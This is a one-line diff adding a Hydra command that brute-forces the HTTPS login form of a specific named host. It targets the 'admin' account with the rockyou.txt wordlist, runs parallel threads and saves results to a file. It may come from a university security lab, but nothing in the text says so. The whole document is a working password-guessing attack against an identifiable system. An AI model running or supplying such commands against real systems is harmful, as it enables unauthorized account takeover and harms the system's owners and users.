@@ -1,0 +1,2 @@
+hydra -l admin -P rockyou.txt nemeziz.dsa.linti.unlp.edu.ar https-post-form "/login:username=^USER^&password=^PASS^:incorrecto" -t 8 -V -F -o archivo.txt
+
